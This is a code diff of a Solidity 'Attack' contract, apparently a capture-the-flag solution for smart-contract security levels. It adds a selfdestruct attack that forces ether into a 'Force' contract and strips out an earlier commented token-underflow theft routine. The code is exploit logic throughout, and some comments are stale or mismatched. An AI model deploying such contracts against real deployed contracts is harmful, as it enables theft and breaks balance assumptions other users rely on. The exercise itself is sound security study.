@@ -1,24 +1,21 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-// import "./Token.sol";
+import "./Force.sol";
 
 contract Attack {
-    // Token public tokenContract;
-    // uint max = 2 ** 256 - 1;
-    // constructor(address payable _tokenContract) public {
-    //     tokenContract = Token(_tokenContract);
-    // }
-    // function attackOne(address _attackEoa) public {
-    //     // call the attack contract and pass in the address of my EOA
-    //     tokenContract.transfer(_attackEoa, 23);
-    //     // Balance of address(this) will be a high overflowed value
-    //     uint balance = tokenContract.balanceOf(address(this));
-    //     // reduce by 30 se we don't end up with an overflow back to our original value
-    //     balance = balance - 50;
-    //     // transfer this new high balance to my attacker address
-    //     tokenContract.transfer(_attackEoa, balance);
-    // }
+    Force public forceContract;
+
+    constructor(address payable _forceContract) {
+        forceContract = Force(_forceContract);
+    }
+
+    function attack() public payable {
+        // call the attack contract and pass in the address of my EOA
+
+        address payable addr = payable(address(forceContract));
+        selfdestruct(addr);
+    }
     // function attackTwo(address _attackEoa) public {
     //     // call the attack contract and pass in the address of my EOA
     //     tokenContract.transfer(_attackEoa, 200000000000);
